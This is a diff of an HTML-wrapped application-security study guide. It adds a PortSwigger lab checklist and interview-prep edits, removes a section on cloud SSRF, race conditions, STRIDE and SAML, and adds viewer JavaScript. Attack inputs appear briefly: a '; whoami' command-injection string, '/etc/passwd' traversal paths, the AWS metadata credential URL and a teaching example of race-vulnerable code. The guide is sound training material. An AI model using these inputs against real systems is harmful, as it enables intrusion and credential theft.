+- [ ] **Stored XSS:** [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
+- [ ] **Reflected XSS:** [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
+- [ ] **Reflected XSS:** [Reflected XSS into a JavaScript string with simple single quote toggle](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
+- [ ] **Reflected XSS:** [Reflected XSS with some SVG markup allowed (WAF bypass)](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
+- [ ] **DOM XSS:** [Reflected DOM XSS (Server reflection feeding client sink)](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-reflected-dom-xss)
+
+---
+
+## 2. SQL Injection (SQLi)
+
+### 🟢 Apprentice Level
+- [ ] **SQLi Authentication Bypass:** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+- [ ] **SQLi Login Bypass:** [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
+- [ ] **UNION Attack:** [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+- [ ] **UNION Attack:** [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
+
+### 🟡 Practitioner Level
+- [ ] **UNION Attack Data Retrieval:** [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+- [ ] **UNION Attack Multi-Database:** [SQL injection attack, querying the database type and version on Oracle/MySQL](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
+- [ ] **Blind Boolean SQLi:** [Blind SQL injection with conditional responses (Character bifurcation extraction)](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+- [ ] **Blind Error SQLi:** [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+- [ ] **Blind Time-Based SQLi:** [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+- [ ] **Blind OOB SQLi:** [Blind SQL injection with out-of-band data interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+---
+
+## 3. Server-Side Request Forgery (SSRF)
+
+### 🟢 Apprentice Level
+- [ ] **Basic SSRF:** [Basic SSRF against the local server (`127.0.0.1` administration portal access)](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+- [ ] **Backend Port Scanning:** [Basic SSRF against another back-end system (Internal subnet discovery)](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
+
+### 🟡 Practitioner Level
+- [ ] **SSRF Filter Bypass:** [SSRF with blacklist-based input filter (Bypassing localhost strings using decimal representations or obfuscated URLs)](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+- [ ] **Open Redirect Chaining:** [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
+- [ ] **Blind SSRF OOB:** [Blind SSRF with Out-of-Band detection (Collaborator polling)](https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection)
+
+---
+
+## 4. Insecure Direct Object References (IDOR) & Broken Access Control
+
+### 🟢 Apprentice Level
+- [ ] **Unprotected Admin Panel:** [Unprotected admin functionality with unpredictable URL (Robots.txt harvesting)](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
+- [ ] **IDOR Document Retrieval:** [Insecure direct object references (IDOR) to sensitive file disclosure](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)
+
+### 🟡 Practitioner Level
+- [ ] **Privilege Elevation:** [User role controlled by request parameter (Tampering cookie or JSON body variables)](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
+- [ ] **URL Matching Bypass:** [URL-matching vulnerability in Super Admin verification engine](https://portswigger.net/web-security/access-control/lab-url-matching-vulnerability-in-admin-functionality)
+- [ ] **Multi-Step Bypass:** [Multi-step process with no access control on later operational workflows](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-later-steps)
+
+---
+
+## 5. API Security & Business Logic Flaws
+
+### 🟢 Apprentice Level
+- [ ] **Logic Flaw Price Manipulation:** [Excessive trust in client-side controls (Intercepting POST cart price tokens)](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
+- [ ] **Logic Flaw Negative Quantity:** [High-level logic vulnerability allowing negative quantity parameter arithmetic](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
+
+### 🟡 Practitioner Level
+- [ ] **API Endpoint Enumeration:** [Finding and exploiting an unused API endpoint via parameter guessing](https://portswigger.net/web-security/api-testing/lab-exploiting-an-unused-api-endpoint)
+- [ ] **Mass Assignment Privilege Escalation:** [Exploiting mass assignment to override privileged object properties](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment)
+- [ ] **Infinite Loop Gift Card Redemption:** [Infinite loop business logic flaw allowing unlimited financial gift card balance stacking](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-loop)
+- [ ] **Concurrency Race Condition:** [Exploiting basic time-of-check to time-of-use race condition in discount validation](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)
+
+---
+
+## 6. XML External Entity (XXE) & Insecure Deserialization
+
+### 🟡 Practitioner Level
+- [ ] **Basic XXE File Extraction:** [Exploiting XXE using external entities to retrieve `/etc/passwd`](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
+- [ ] **XXE SSRF Chaining:** [Exploiting XXE to perform SSRF attacks against local EC2 Instance Metadata endpoints](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
+- [ ] **Insecure Deserialization Session Modification:** [Modifying serialized object attribute primitives in base64 cookie strings](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+
+---
+
+## 7. Command Injection & Path Traversal
+
+### 🟢 Apprentice Level
+- [ ] **Basic OS Command Injection:** [OS command injection, simple application parameter string breakout (`; whoami`)](https://portswigger.net/web-security/os-command-injection/lab-simple)
+- [ ] **Basic File Traversal:** [File path traversal, simple sequence string (`../../../../etc/passwd`)](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+
+### 🟡 Practitioner Level
+- [ ] **Blind Command Injection OOB:** [Blind OS command injection with Out-of-Band data interaction and hostname extraction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+- [ ] **Traversal Strip Bypass:** [File path traversal, traversal sequences stripped with superfluous url encoding or nested directories (`....//`)](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-encode)
+
+
+---
+
+<a id="section-13_interview_prep"></a>
+# 🎤 13: Interview Preparation & Company Whiteboard Patterns
 
 ## 1. Indian AppSec Job Market
 
@@ -2870,11 +4503,8 @@ The AppSec market in India is booming, driven by compliance requirements and a s
 | **Big 4 (EY, PwC, Deloitte)** | Cyber Security Consultant | ₹6L - ₹12L | Compliance, VAPT, client communication |
 | **Pure Security (Payatu)** | Security Consultant, Pen Tester | ₹5L - ₹12L | Deep hacking skills, CVE hunting, zero-days |
 
-* **Networking is Key:** Active participation on LinkedIn and Twitter (Infosec community) often leads to direct referrals, bypassing HR filters.
-
 ## 2. Resume Building
 
-* **Presenting Self-Study:** Don't just list tools. Frame self-study as project experience. Instead of "Learned Burp Suite," write: "Conducted comprehensive vulnerability assessments on intentionally vulnerable applications (Juice Shop, PortSwigger Labs) identifying and documenting OWASP Top 10 flaws including complex SQLi and DOM XSS."
 * **Certifications:**
   * *Entry/Filter pass:* CEH, CompTIA Security+.
   * *High Value:* eWPT, eJPT, PortSwigger BSCP.
@@ -2883,12 +4513,14 @@ The AppSec market in India is booming, driven by compliance requirements and a s
 
 ## 3. Company-Specific Interview Patterns
 
+To read real interview experiences for these and other companies, search for "AppSec Interview Experience" on [Medium's InfoSec Write-ups](https://infosecwriteups.com/) or check company profiles on Glassdoor.
+
 * **Product Companies (Flipkart, Razorpay, CRED, Paytm):**
   * *Focus:* Deep understanding of modern tech stacks (Node.js, Go, AWS). They care less about Nessus scans and more about securing CI/CD pipelines, DevSecOps, and API security (JWT, mass assignment).
   * *Rounds:* Often include a hands-on lab or take-home assignment to exploit/secure an app, followed by deep architecture discussions.
 * **MNCs (Microsoft, Amazon, Google, Cisco):**
   * *Focus:* Deep computer science fundamentals (OS internals, networking), cryptography, and large-scale threat modeling.
-  * *Rounds:* Almost always include a **Coding/DSA round** (LeetCode Easy/Medium) because they expect security engineers to read and write code fluently.
+  * *Rounds:* Almost always include a **Coding/DSA round** (LeetCode Easy/Medium) because they expect security engineers to read and write code fluently. For FAANG-level security prep, review the [Cybersecurity Interview Questions compiled by various communities on GitHub](https://github.com/topics/security-interview).
 * **Big 4 (Deloitte, EY):**
   * *Focus:* Methodology, risk assessment, report writing, and compliance frameworks (ISO, PCI DSS).
   * *Rounds:* Scenario-based ("How would you pitch this critical vulnerability to a non-technical manager?").
@@ -3074,11 +4706,10 @@ If an application forcefully appends `.txt` to uploads (e.g., `shell.php` become
 * **Think Out Loud:** In scenario questions, the thought process is more important than the final answer. Walk them through your methodology.
 * **Admit When You Don't Know:** Never guess. Say, "I haven't worked with that specific tool, but based on my knowledge of X, I assume it works similarly by doing Y. I would look up the documentation to confirm."
 
-
 ---
 
-<a id="section-09_readiness_checklist"></a>
-# 09: Post-Course Readiness Checklist & Resources
+<a id="section-14_readiness_checklist"></a>
+# ✅ 14: Post-Course Readiness & Capstone Career Checklist
 
 Congratulations on reaching the end of the 16-week AppSec guide! Before you step into your first technical interview for an Application Security or Pentesting role, ensure you have deeply studied and practiced the following topics.
 
@@ -3129,187 +4760,11 @@ This is your final checklist. If you can explain, identify, and exploit these 22
 
 ---
 
-<a id="section-10_advanced_topics"></a>
-# Section 10: Advanced Topics & Cloud Security (Weeks 17-18)
-
-Welcome to the final frontier. This section covers the advanced, modern attacks that separate entry-level analysts from top-tier AppSec Engineers at product companies like Razorpay, CRED, Flipkart, and global MNCs. 
-
----
-
-## 1. Cloud Security Basics for AppSec (AWS Focus)
-
-Modern applications are hosted in the cloud. As an AppSec engineer, you must understand how web vulnerabilities escalate into full cloud compromise. While we focus heavily on AWS (as it's dominant in the Indian startup ecosystem), the concepts apply to GCP and Azure as well.
-
-### 🎯 SSRF to Cloud Metadata Compromise
-**What it is:** When an application is vulnerable to Server-Side Request Forgery (SSRF), an attacker can force the server to make requests to internal IP addresses. In a cloud environment, the most dangerous IP is the **Instance Metadata Service (IMDS)** at `169.254.169.254`.
-
-- **AWS Context:** By hitting `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name`, the attacker can steal temporary AWS access keys associated with the EC2 instance.
-- **GCP/Azure Context:** Similar services exist (e.g., GCP requires a `Metadata-Flavor: Google` header, making basic SSRF harder to exploit).
-
-**Mitigation (AWS IMDSv2):** 
-AWS introduced IMDSv2, which requires the client to first fetch a session token via a `PUT` request with a specific header (`X-aws-ec2-metadata-token-ttl-seconds`). Since standard SSRF usually only controls `GET` requests and cannot inject custom headers, IMDSv2 effectively kills this attack vector.
-
-### 🪣 S3 Bucket Misconfigurations
-**What it is:** Amazon S3 (Simple Storage Service) buckets are often misconfigured to allow public read or write access.
-- **Public Read:** Leads to massive data leaks (PII, source code, backups).
-- **Public Write:** Attackers can overwrite files. If the bucket hosts JavaScript files for a website, an attacker can overwrite them to achieve **Stored XSS** across the entire application (Supply Chain Attack).
-- **Subdomain Takeover (Dangling DNS):** If a company points `assets.shop.com` to an S3 bucket (`shop-assets-123.s3.amazonaws.com`), but later deletes the bucket without removing the DNS record, an attacker can create a bucket with the exact same name and take over the subdomain.
-
-### 🔑 IAM Privilege Escalation
-**What it is:** Identity and Access Management (IAM) defines who can do what. If an application (or stolen token) has overly permissive policies (e.g., `iam:PutUserPolicy`), an attacker can grant themselves Admin access.
-
-<details>
-<summary><b>🎤 Interview Q: How would you prevent SSRF from escalating to a cloud compromise?</b></summary>
-<b>Answer:</b> 
-1. Enforce IMDSv2 across all AWS instances, which blocks simple GET-based SSRF by requiring a PUT token. 
-2. Apply the Principle of Least Privilege to the EC2 IAM role so even if keys are stolen, they cannot access sensitive data like S3 or databases.
-3. Use a strict egress firewall or proxy to prevent the server from connecting to `169.254.169.254`.
-</details>
-
----
-
-
-## 2. Business Logic & Fintech Vulnerabilities
-
-For companies handling money, business logic flaws are often more critical than technical injection flaws.
-
-### 🏎️ Race Conditions (TOCTOU - Time of Check to Time of Use)
-**What it is:** A concurrency flaw where multiple requests hit the server at the exact same millisecond. The server checks a condition (e.g., "does the user have enough balance?") for all requests simultaneously *before* it updates the database for any of them.
-
-**Code-Level Example (Node.js/Python logic):**
-Imagine a user with ₹100 balance attempting to transfer ₹100. They use Burp Suite to send 5 requests at the exact same time.
-
-```javascript
-// ❌ VULNERABLE CODE (No locking)
-async function transferMoney(userId, amount) {
-    // Check: Database reads balance
-    const account = await db.query('SELECT balance FROM accounts WHERE id = ?', [userId]);
-    
-    if (account.balance >= amount) {
-        // Attackers send 5 requests simultaneously.
-        // ALL 5 requests hit this IF condition before the UPDATE happens!
-        
-        // Use: Database updates balance
-        const newBalance = account.balance - amount;
-        await db.query('UPDATE accounts SET balance = ? WHERE id = ?', [newBalance, userId]);
-        return "Transfer successful";
-    }
-    return "Insufficient funds";
-}
-```
-
-**Result:** The attacker transfers ₹500 even though they only had ₹100.
-
-**Mitigation (Database Locking):**
-Use Pessimistic Locking (e.g., `SELECT ... FOR UPDATE` in SQL) or Optimistic Locking (version columns).
-
-```javascript
-// ✅ SECURE CODE (Pessimistic Locking)
-async function transferMoney(userId, amount) {
-    // BEGIN TRANSACTION
-    // SELECT ... FOR UPDATE locks the row. Other concurrent requests must wait in a queue.
-    const account = await db.query('SELECT balance FROM accounts WHERE id = ? FOR UPDATE', [userId]);
-    
-    if (account.balance >= amount) {
-        const newBalance = account.balance - amount;
-        await db.query('UPDATE accounts SET balance = ? WHERE id = ?', [newBalance, userId]);
-        // COMMIT TRANSACTION (Row is unlocked)
-        return "Transfer successful";
-    }
-    return "Insufficient funds";
-}
-```
-
-### 💸 Parameter Tampering & Price Manipulation
-**What it is:** Attackers modify hidden fields or intercept traffic to change the price of an item or the quantity before checkout.
-- **Exploit:** Changing `price=100` to `price=1` in the POST request.
-- **Negative Values:** Sending `quantity=-1` to force the system to *refund* money instead of charging it.
-- **Mitigation:** Never trust the client for pricing. The server must recalculate the total cost based on the internal product database using the `product_id`.
-
----
-
-
-## 3. Threat Modeling (The STRIDE Framework)
-
-Threat modeling is the process of identifying vulnerabilities during the **design phase**, before any code is written. 
-
-### 🛡️ The STRIDE Methodology
-Developed by Microsoft, STRIDE helps categorize threats:
-- **S**poofing (Impersonating something or someone) → Mitigate with AuthN.
-- **T**ampering (Modifying data in transit or at rest) → Mitigate with TLS, Hashing.
-- **R**epudiation (Claiming you didn't do something) → Mitigate with Logging/Auditing.
-- **I**nformation Disclosure (Data leaks) → Mitigate with Encryption.
-- **D**enial of Service (Crashing the system) → Mitigate with Rate Limiting.
-- **E**levation of Privilege (Gaining admin rights) → Mitigate with AuthZ/RBAC.
-
-### 🎤 Whiteboard Interview Scenario 1: Standard User Login Page
-*Interviewer: "Draw a standard login page architecture and threat model it."*
-
-1. **Spoofing:** Attacker uses credential stuffing. (Mitigation: MFA, Account Lockouts).
-2. **Tampering:** Attacker modifies the JWT in transit. (Mitigation: HTTPS, Strong JWT Signatures).
-3. **Repudiation:** User denies logging in from a foreign country. (Mitigation: Store IP/User-Agent logs securely).
-4. **Information Disclosure:** Server responds with "Username does not exist" revealing valid accounts. (Mitigation: Generic error messages).
-5. **Denial of Service:** Attacker brute-forces 100k requests to exhaust database connections. (Mitigation: Rate limiting, CAPTCHA).
-
-### 🎤 Whiteboard Interview Scenario 2: Fintech Payment Gateway
-*Interviewer: "Threat model the transaction flow of a payment gateway like Razorpay."*
-
-1. **Spoofing:** A malicious merchant spoofs a callback to the main app saying "Payment Successful". (Mitigation: Webhook signatures/HMAC validation).
-2. **Tampering:** User intercepts the `amount=500` parameter and changes it to `amount=1`. (Mitigation: Verify amounts server-side against the original cart ID).
-3. **Information Disclosure:** Payment API logs full credit card numbers in CloudWatch. (Mitigation: Data masking, Tokenization/PCI-DSS compliance).
-4. **Elevation of Privilege (Business Logic):** Race condition allowing double-withdrawal. (Mitigation: Database `FOR UPDATE` locks).
-
----
-
-
-## 4. Advanced Authentication (SAML & SSO)
-
-While OAuth/OIDC are common for consumer apps (B2C), enterprise applications (B2B) rely heavily on SAML.
-
-### 📑 SAML (Security Assertion Markup Language)
-**What it is:** An XML-based standard for exchanging authentication data between an Identity Provider (IdP) like Okta/Azure AD, and a Service Provider (SP) like your web app.
-- **The Attack (XML Signature Wrapping - XSW):** SAML assertions are cryptographically signed. However, if the Service Provider's XML parser is flawed, an attacker can duplicate the assertion, alter the duplicated version (e.g., change `user@normal.com` to `admin@company.com`), and trick the parser into verifying the original signature but processing the malicious data.
-- **Mitigation:** Use established, well-vetted SAML libraries that enforce strict schema validation and reject duplicate assertion tags.
-
-### 🌐 OpenID Connect (OIDC) vs OAuth2
-- **OAuth2** is for **Authorization** (giving a third-party app access to your data, like "Sign in with Google to read my contacts"). It issues an Access Token.
-- **OIDC** sits on top of OAuth2 and adds **Authentication**. It issues an **ID Token** (usually a JWT) containing user identity information.
-
----
-
-
-## 5. Vulnerability Triage & CVSS Scoring
-
-Finding a bug is only step one. Communicating its risk is step two.
-
-### 🧮 CVSS v3.1 (Common Vulnerability Scoring System)
-A framework for rating the severity of vulnerabilities from 0.0 to 10.0.
-1. **Attack Vector (AV):** Is it exploitable over the Network, Adjacent, Local, or Physical?
-2. **Attack Complexity (AC):** Is it Low (easy to exploit) or High (requires race conditions or specific setups)?
-3. **Privileges Required (PR):** None, Low, or High?
-4. **User Interaction (UI):** None or Required (e.g., XSS requires a user to click).
-5. **Scope (S):** Unchanged or Changed (e.g., escaping a sandbox)?
-6. **CIA Impact:** Confidentiality, Integrity, Availability (None, Low, High).
-
-*Example:* A Stored XSS that requires a victim to click a link (UI:R) and steals cookies (C:L, I:L, A:N) might score a 5.4 (Medium). An unauthenticated Remote Code Execution (AV:N, PR:N, C:H, I:H, A:H) is a 9.8-10.0 (Critical).
-
-### 📝 Writing a Good Pentest Report
-1. **Executive Summary:** For the CTO/Managers. Non-technical explanation of the business risk ("An attacker could steal all customer credit cards").
-2. **Technical Details:** For the Developers. 
-   - Vulnerability Name & Description.
-   - Exact Steps to Reproduce (PoC).
-   - HTTP Request/Response snippets.
-   - Recommended Fix (Code level).
-
-
-
----
-
 
     </textarea>
 
     <script>
-        // Configure marked.js to use highlight.js
+        // =================== MARKDOWN PARSING ===================
         marked.setOptions({
             highlight: function(code, lang) {
                 const language = hljs.getLanguage(lang) ? lang : 'plaintext';
@@ -3318,14 +4773,21 @@ A framework for rating the severity of vulnerabilities from 0.0 to 10.0.
             langPrefix: 'hljs language-'
         });
 
-        // Get markdown content and parse it
         const rawMarkdown = document.getElementById('raw-markdown').value;
         const htmlContent = marked.parse(rawMarkdown);
-        
         const container = document.getElementById('content-container');
         container.innerHTML = htmlContent;
 
-        // Intercept anchor clicks to smooth scroll correctly in the main-wrapper
+        // =================== EXTERNAL LINKS: OPEN IN NEW TAB ===================
+        container.querySelectorAll('a').forEach(a => {
+            const href = a.getAttribute('href');
+            if (href && !href.startsWith('#')) {
+                a.setAttribute('target', '_blank');
+                a.setAttribute('rel', 'noopener noreferrer');
+            }
+        });
+
+        // =================== ANCHOR CLICK HANDLING ===================
         container.addEventListener('click', function(e) {
             const link = e.target.closest('a');
             if (link && link.getAttribute('href') && link.getAttribute('href').startsWith('#')) {
@@ -3338,35 +4800,272 @@ A framework for rating the severity of vulnerabilities from 0.0 to 10.0.
             }
         });
 
-        // Build Table of Contents dynamically
+        // =================== TABLE OF CONTENTS + PROGRESS ===================
         const toc = document.getElementById('toc');
         const headers = container.querySelectorAll('h1, h2, h3');
+        const h2Headers = [];
+        const savedProgress = JSON.parse(localStorage.getItem('appsec-progress') || '{}');
         
         headers.forEach((header, index) => {
-            // Give header an ID if it doesn't have one
-            if (!header.id) {
-                header.id = 'heading-' + index;
-            }
-            
-            // Skip the main H1 title for TOC sidebar
+            if (!header.id) { header.id = 'heading-' + index; }
             if (header.tagName === 'H1' && index === 0) return;
             
             const li = document.createElement('li');
+            li.className = 'toc-' + header.tagName.toLowerCase();
+            
+            // Add checkbox for h2 headers
+            if (header.tagName === 'H2') {
+                const cb = document.createElement('input');
+                cb.type = 'checkbox';
+                cb.className = 'toc-checkbox';
+                cb.checked = !!savedProgress[header.id];
+                cb.addEventListener('change', function() {
+                    const progress = JSON.parse(localStorage.getItem('appsec-progress') || '{}');
+                    if (this.checked) { progress[header.id] = true; }
+                    else { delete progress[header.id]; }
+                    localStorage.setItem('appsec-progress', JSON.stringify(progress));
+                    updateProgressBar();
+                });
+                li.appendChild(cb);
+                h2Headers.push(header.id);
+            }
+
             const a = document.createElement('a');
-            
             a.href = '#' + header.id;
-            a.textContent = header.textContent.replace(/[^\w\s​-‍﻿]/gi, '').trim() || header.textContent; // clean emojis for toc
-            a.className = 'toc-' + header.tagName.toLowerCase();
-            
-            // Smooth scroll for sidebar links
+            a.textContent = header.textContent.replace(/[^\w\s\u200B-\u200D\uFEFF]/gi, '').trim() || header.textContent;
+
             a.addEventListener('click', function(e) {
                 e.preventDefault();
                 document.getElementById('sidebar').classList.remove('open');
+                document.getElementById('sidebar-overlay').classList.remove('active');
                 document.getElementById(header.id).scrollIntoView({ behavior: 'smooth' });
             });
 
             li.appendChild(a);
             toc.appendChild(li);
+        });
+
+        function updateProgressBar() {
+            const progress = JSON.parse(localStorage.getItem('appsec-progress') || '{}');
+            const total = h2Headers.length;
+            const done = h2Headers.filter(id => progress[id]).length;
+            const pct = total > 0 ? (done / total) * 100 : 0;
+            document.getElementById('progress-bar').style.width = pct + '%';
+        }
+        updateProgressBar();
+
+        // =================== COLLAPSIBLE SECTIONS ===================
+        const h2Elements = container.querySelectorAll('h2');
+        h2Elements.forEach(h2 => {
+            h2.classList.add('collapse-toggle');
+            
+            // Wrap content between this h2 and the next h2/h1/hr into a div
+            const wrapper = document.createElement('div');
+            wrapper.className = 'section-collapsible';
+            let next = h2.nextElementSibling;
+            const children = [];
+            while (next && next.tagName !== 'H2' && next.tagName !== 'H1' && next.tagName !== 'HR') {
+                children.push(next);
+                next = next.nextElementSibling;
+            }
+            if (children.length > 0) {
+                h2.after(wrapper);
+                children.forEach(c => wrapper.appendChild(c));
+            }
+
+            h2.addEventListener('click', function() {
+                const section = this.nextElementSibling;
+                if (section && section.classList.contains('section-collapsible')) {
+                    section.classList.toggle('collapsed');
+                    this.classList.toggle('collapsed-heading');
+                }
+            });
+        });
+
+        let allCollapsed = false;
+        function toggleCollapseAll() {
+            allCollapsed = !allCollapsed;
+            const btn = document.getElementById('collapse-btn');
+            btn.textContent = allCollapsed ? '📂 Expand All' : '📂 Collapse All';
+            document.querySelectorAll('.section-collapsible').forEach(s => {
+                if (allCollapsed) { s.classList.add('collapsed'); }
+                else { s.classList.remove('collapsed'); }
+            });
+            document.querySelectorAll('.collapse-toggle').forEach(h => {
+                if (allCollapsed) { h.classList.add('collapsed-heading'); }
+                else { h.classList.remove('collapsed-heading'); }
+            });
+        }
+
+        // =================== QUIZ MODE ===================
+        let quizMode = false;
+        function toggleQuizMode() {
+            quizMode = !quizMode;
+            document.body.classList.toggle('quiz-mode', quizMode);
+            const btn = document.getElementById('quiz-btn');
+            btn.classList.toggle('active', quizMode);
+            btn.textContent = quizMode ? '🧠 Quiz ON' : '🧠 Quiz';
+            
+            if (quizMode) {
+                // Close all details so user can self-test
+                document.querySelectorAll('details[open]').forEach(d => d.removeAttribute('open'));
+                // Scroll to the first details element
+                const firstQ = container.querySelector('details');
+                if (firstQ) firstQ.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+            
+            // Count total questions
+            const totalQ = container.querySelectorAll('details').length;
+            if (quizMode && totalQ > 0) {
+                btn.textContent = '🧠 Quiz ON (' + totalQ + ' Q)';
+            }
+        }
+
+        // =================== SEARCH ===================
+        let searchTimeout;
+        function handleSearch(query) {
+            clearTimeout(searchTimeout);
+            searchTimeout = setTimeout(() => performSearch(query), 250);
+        }
+
+        function performSearch(query) {
+            // Remove old highlights
+            container.querySelectorAll('mark.search-highlight').forEach(m => {
+                const parent = m.parentNode;
+                parent.replaceChild(document.createTextNode(m.textContent), m);
+                parent.normalize();
+            });
+            
+            const countEl = document.getElementById('search-count');
+            if (!query || query.length < 2) { countEl.textContent = ''; return; }
+            
+            const walker = document.createTreeWalker(container, NodeFilter.SHOW_TEXT, null, false);
+            const matches = [];
+            let node;
+            
+            while (node = walker.nextNode()) {
+                if (node.parentElement.tagName === 'SCRIPT' || node.parentElement.tagName === 'STYLE') continue;
+                if (node.parentElement.tagName === 'CODE' && node.parentElement.parentElement.tagName === 'PRE') continue;
+                const idx = node.textContent.toLowerCase().indexOf(query.toLowerCase());
+                if (idx !== -1) { matches.push({ node, idx }); }
+            }
+            
+            countEl.textContent = matches.length > 0 ? matches.length + ' found' : 'No results';
+            
+            // Highlight matches (limit to 100 for performance)
+            matches.slice(0, 100).reverse().forEach(({ node, idx }) => {
+                const range = document.createRange();
+                range.setStart(node, idx);
+                range.setEnd(node, idx + query.length);
+                const mark = document.createElement('mark');
+                mark.className = 'search-highlight';
+                range.surroundContents(mark);
+            });
+            
+            // Scroll to first match
+            const firstMark = container.querySelector('mark.search-highlight');
+            if (firstMark) {
+                firstMark.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        }
+
+        // =================== DARK/LIGHT THEME ===================
+        function toggleTheme() {
+            const html = document.documentElement;
+            const current = html.getAttribute('data-theme');
+            const next = current === 'dark' ? 'light' : 'dark';
+            html.setAttribute('data-theme', next);
+            localStorage.setItem('appsec-theme', next);
+            updateThemeBtn(next);
+        }
+        function updateThemeBtn(theme) {
+            const btn = document.getElementById('theme-btn');
+            if (btn) btn.textContent = theme === 'dark' ? '🌓 Light' : '🌓 Dark';
+        }
+        // Load saved theme
+        const savedTheme = localStorage.getItem('appsec-theme') || 'dark';
+        document.documentElement.setAttribute('data-theme', savedTheme);
+        updateThemeBtn(savedTheme);
+
+        // =================== BACK TO TOP ===================
+        const backToTopBtn = document.getElementById('back-to-top');
+        const mainWrapper = document.getElementById('main-wrapper');
+        
+        mainWrapper.addEventListener('scroll', function() {
+            if (this.scrollTop > 300) { backToTopBtn.classList.add('visible'); }
+            else { backToTopBtn.classList.remove('visible'); }
+        });
+        // Also handle body scroll on mobile
+        window.addEventListener('scroll', function() {
+            if (window.scrollY > 300) { backToTopBtn.classList.add('visible'); }
+            else { backToTopBtn.classList.remove('visible'); }
+        });
+        
+        function scrollToTop() {
+            mainWrapper.scrollTo({ top: 0, behavior: 'smooth' });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // =================== MOBILE SIDEBAR ===================
+        function toggleMobileSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebar-overlay').classList.toggle('active');
+        }
+
+        // =================== KEYBOARD SHORTCUTS ===================
+        document.addEventListener('keydown', function(e) {
+            const isInput = e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable;
+            
+            // Ctrl+K or / to open search
+            if ((e.ctrlKey && e.key === 'k') || (!isInput && e.key === '/')) {
+                e.preventDefault();
+                const searchBox = document.getElementById('search-box');
+                if (searchBox) {
+                    searchBox.focus();
+                    searchBox.select();
+                }
+            }
+            // Esc to blur search box or close mobile sidebar
+            if (e.key === 'Escape') {
+                if (isInput) e.target.blur();
+                const sidebar = document.getElementById('sidebar');
+                if (sidebar && sidebar.classList.contains('open')) toggleMobileSidebar();
+            }
+            if (isInput) return; // ignore Q, T, C when typing in an input box
+            
+            // Q to toggle quiz mode
+            if (e.key.toLowerCase() === 'q') {
+                e.preventDefault();
+                toggleQuizMode();
+            }
+            // T to toggle theme
+            if (e.key.toLowerCase() === 't') {
+                e.preventDefault();
+                toggleTheme();
+            }
+            // C to toggle collapse all
+            if (e.key.toLowerCase() === 'c') {
+                e.preventDefault();
+                toggleCollapseAll();
+            }
+        });
+
+        // =================== TASK & LAB CHECKBOX PERSISTENCE ===================
+        const savedLabProgress = JSON.parse(localStorage.getItem('appsec-labs-progress') || '{}');
+        container.querySelectorAll('input[type="checkbox"]').forEach((chk, index) => {
+            chk.removeAttribute('disabled');
+            chk.style.cursor = 'pointer';
+            chk.style.width = '16px';
+            chk.style.height = '16px';
+            chk.style.marginRight = '8px';
+            const labId = 'lab-chk-' + index;
+            if (savedLabProgress[labId]) {
+                chk.checked = true;
+            }
+            chk.addEventListener('change', function() {
+                savedLabProgress[labId] = chk.checked;
+                localStorage.setItem('appsec-labs-progress', JSON.stringify(savedLabProgress));
+            });
         });
     </script>
 </body>
